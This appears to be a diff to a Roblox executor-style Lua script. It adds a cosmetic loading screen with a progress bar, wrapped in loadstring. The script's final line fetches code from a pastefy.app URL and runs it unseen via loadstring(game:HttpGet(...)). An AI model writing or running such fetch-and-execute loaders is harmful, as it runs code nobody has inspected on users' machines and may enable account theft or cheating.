@@ -1,1 +1,51 @@
+loadstring([[
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LoadingScreen"
+screenGui.Parent = playerGui
+
+-- Create Frame (background)
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+frame.Parent = screenGui
+
+-- Create TextLabel
+local textLabel = Instance.new("TextLabel")
+textLabel.Size = UDim2.new(0, 300, 0, 50)
+textLabel.Position = UDim2.new(0.5, -150, 0.5, -25)
+textLabel.BackgroundTransparency = 1
+textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+textLabel.TextScaled = true
+textLabel.Font = Enum.Font.SourceSansBold
+textLabel.Text = "Loading... 0%"
+textLabel.Parent = frame
+
+-- Create ProgressBar Background
+local barBg = Instance.new("Frame")
+barBg.Size = UDim2.new(0, 300, 0, 20)
+barBg.Position = UDim2.new(0.5, -150, 0.5, 40)
+barBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+barBg.Parent = frame
+
+-- Create ProgressBar Fill
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+barFill.Parent = barBg
+
+-- Loading loop
+for i = 0, 100 do
+	textLabel.Text = "Loading... " .. i .. "%"
+	barFill.Size = UDim2.new(i/100, 0, 1, 0)
+	wait(0.05) -- speed of loading (adjust as needed)
+end
+
+-- Remove loading screen after finished
+wait(0.5)
+screenGui:Destroy()
+]])()
 loadstring(game:HttpGet("https://pastefy.app/puEVPJZf/raw"))()
